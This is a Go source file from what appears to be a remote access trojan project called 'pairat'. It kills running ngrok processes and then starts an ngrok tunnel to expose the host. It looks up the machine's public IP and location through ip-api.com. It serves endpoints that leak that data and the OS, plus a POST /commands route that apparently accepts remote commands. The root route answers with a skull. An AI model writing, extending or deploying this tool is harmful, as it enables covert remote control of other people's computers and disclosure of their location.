package core

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"regexp"
	"runtime"

	"github.com/ELPanaJose/pairat/src/routes"
	"github.com/ELPanaJose/pairat/src/utils"
	"github.com/labstack/echo"
	"github.com/labstack/echo/middleware"
)

var (
	DetectNgrok = regexp.MustCompile(`(https:)([/|.|\w|\s|-])*\.(?:io)`) // this is the regex for get the url
)

func SetUpRoutes() {
	// detect the OS
	utils.DetecOS()
	// kill node and ngrok if is running
	utils.KillProcess()
	// execute the "cli"
	utils.Cli()
	// execute ngrok
	utils.ExecuteNgrok()
	// Echo instance
	e := echo.New()

	// Middleware
	e.Use(middleware.Logger())
	e.Use(middleware.Recover())

	// Routes

	resp, err := http.Get("http://ip-api.com/json")
	if err != nil {
		log.Fatalln(err)
	}
	//We Read the response body on the line below.
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatalln(err)
	}
	//Convert the body to type string
	sb := string(body)

	res, err := http.Get("http://127.0.0.1:4040/api/tunnels")
	if err != nil {
		fmt.Println(err)
		return
	}

	body1, err1 := ioutil.ReadAll(res.Body)
	if err1 != nil {
		fmt.Println(err1)
		return
	}
	urlNgrok := DetectNgrok.FindString(string(body1))

	commands := urlNgrok + "/commands"
	ip := urlNgrok + "/ip"
	os := urlNgrok + "/ip/os"

	type url struct {
		Url   string
		Urlos string
		Urlip string
	}

	type allUrl []url

	var urls = allUrl{
		{
			Url:   commands,
			Urlos: os,
			Urlip: ip,
		},
	}

	/*

		Routes

	*/
	e.GET("/", func(c echo.Context) error {
		c.String(http.StatusOK, "💀")
		return nil
	})
	e.GET("/ngrok", func(c echo.Context) error {
		c.Response().Header().Set("Content-Type", "application/json")
		json.NewEncoder(c.Response()).Encode(urls)
		return nil
	})
	e.GET("/ip", func(c echo.Context) error {
		c.String(http.StatusOK, sb)
		return nil
	})
	e.GET("/ip/os", func(c echo.Context) error {
		c.String(http.StatusOK, runtime.GOOS)
		return nil
	})

	e.POST("/commands", routes.UploadCommand)

	// Start server
	e.Logger.Fatal(e.Start(":1323"))
}
